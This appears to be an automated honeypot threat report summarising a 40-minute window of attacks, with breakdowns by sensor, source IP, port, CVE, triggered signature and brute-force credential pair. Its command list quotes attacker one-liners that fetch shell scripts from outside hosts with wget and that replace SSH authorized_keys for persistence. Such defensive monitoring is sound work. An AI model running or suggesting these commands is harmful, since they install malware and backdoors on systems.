Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-04T12:01:28Z
**Timeframe:** 2025-10-04T11:20:01Z to 2025-10-04T12:00:01Z
**Files Used:**
- agg_log_20251004T112001Z.json
- agg_log_20251004T114001Z.json
- agg_log_20251004T120001Z.json

**Executive Summary:**
This report summarizes honeypot activity over a 40-minute period, based on data from three log files. A total of 11,730 attacks were recorded across various honeypots. The most targeted services were SMB (port 445), SSH (port 22), and SMTP (port 25). The majority of attacks originated from the IP address 182.53.12.81. Attackers attempted to exploit several vulnerabilities, with CVEs from 2002, 2006, 2019, 2021 and 2024 being logged. A significant number of commands were executed on the Cowrie honeypot, indicating attempts to profile the system and establish further access.

**Detailed Analysis:**

**Attacks by Honeypot:**
- Cowrie: 4848
- Dionaea: 3127
- Ciscoasa: 1545
- Mailoney: 846
- Suricata: 708
- Sentrypeer: 275
- Honeytrap: 112
- Tanner: 123
- Redishoneypot: 39
- Adbhoney: 27
- H0neytr4p: 33
- ConPot: 26
- Honeyaml: 8
- ElasticPot: 5
- Dicompot: 4
- Heralding: 3
- Ipphoney: 1

**Top Attacking IPs:**
- 182.53.12.81: 2621
- 103.153.104.219: 475
- 85.208.253.184: 415
- 176.65.141.117: 820
- 51.178.141.222: 326
- 146.190.154.85: 347
- 116.203.194.102: 272
- 77.90.8.211: 218
- 159.65.135.15: 345
- 122.147.148.236: 174
- 192.3.219.125: 203
- 87.201.127.149: 283
- 94.181.229.254: 198
- 46.105.87.113: 162
- 103.76.120.69: 218

**Top Targeted Ports/Protocols:**
- 445: 3096
- 22: 616
- 25: 840
- 5060: 275
- 80: 123
- 443: 33
- 6379: 39
- 23: 45

**Most Common CVEs:**
- CVE-2002-1149
- CVE-2021-3449
- CVE-2002-0013
- CVE-2002-0012
- CVE-1999-0517
- CVE-2019-11500
- CVE-2019-12263
- CVE-2019-12261
- CVE-2019-12260
- CVE-2019-12255
- CVE-2006-2369
- CVE-2024-12856
- CVE-2024-12885
- CVE-2024-3721
- CVE-2006-3602
- CVE-2006-4458
- CVE-2006-4542

**Commands Attempted by Attackers:**
- uname -a
- uname -m
- cd ~; chattr -ia .ssh; lockr -ia .ssh
- lockr -ia .ssh
- cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
- cat /proc/cpuinfo | grep name | wc -l
- cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
- free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
- ls -lh $(which ls)
- which ls
- crontab -l
- w
- top
- uname
- whoami
- lscpu | grep Model
- df -h | head -n 2 | awk 'FNR == 2 {print $2;}'
- Enter new UNIX password:
- tftp; wget; /bin/busybox JOUPP
- tftp; wget; /bin/busybox MYUBC
- cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://196.251.70.174/1.sh; ...
- rm -rf /data/local/tmp; mkdir -p /data/local/tmp; cd /data/local/tmp/; busybox wget http://213.209.143.62/w.sh; ...
- echo "cat /proc/1/mounts && ls /proc/1/; curl2; ps aux; ps" | sh

**Signatures Triggered:**
- ET DROP Dshield Block Listed Source group 1
- ET SCAN NMAP -sS window 1024
- ET INFO Reserved Internal IP Traffic
- ET SCAN Potential SSH Scan
- ET DROP Spamhaus DROP Listed Traffic Inbound
- ET WEB_SERVER WEB-PHP phpinfo access
- ET CINS Active Threat Intelligence Poor Reputation IP
- ET EXPLOIT Possible OpenSSL TLSv1.2 DoS Inbound (CVE-2021-3449)
- ET INFO CURL User Agent

**Users / Login Attempts:**
- 345gs5662d34/345gs5662d34
- root/nPSpP4PBW0
- root/3245gs5662d34
- azureuser/P@ssw0rd123
- test/zhbjETuyMffoL8F
- root/2glehe5t24th1issZs
- suraj/3245gs5662d34
- admin/123456!!
- nikhil/nikhil
- azureuser/azureuser@1234
- ubuntu/12344321
- mishra/mishra123
- andrew/P@ssw0rd
- terry/terry123
- admin/adminsisdoc
- TEST/TEST123
- tomcat/1234
- asad/123
- diego/diego123
- oracle/redhat
- rajeev/rajeev@123
- josh/123

**Files Uploaded/Downloaded:**
- wget.sh;
- 1.sh;
- discovery
- 3.253.97.195:8088
- apply.cgi
- w.sh;
- c.sh;
- soap-envelope
- soap-encoding
- addressing
- a:ReplyTo><a:To
- wsdl

**HTTP User-Agents:**
- No user agents recorded.

**SSH Clients and Servers:**
- No specific SSH clients or servers recorded.

**Top Attacker AS Organizations:**
- No attacker AS organizations recorded.

**Key Observations and Anomalies:**
- The high number of attacks from 182.53.12.81 suggests a targeted campaign or a botnet.
- The variety of commands executed on the Cowrie honeypot indicates that attackers are attempting to perform reconnaissance and establish a persistent presence.
- The presence of commands related to downloading and executing shell scripts (e.g., `wget`, `curl`, `sh`) indicates attempts to install malware or backdoors.
- The combination of reconnaissance commands (e.g., `uname`, `lscpu`, `free`) and attempts to modify SSH authorized_keys files is a common pattern for attackers seeking to gain control of a system.
- The targeting of SMB port 445 is likely related to attempts to exploit vulnerabilities like EternalBlue.
- The mix of old and new CVEs suggests that attackers are using a broad range of exploits to target a variety of systems.
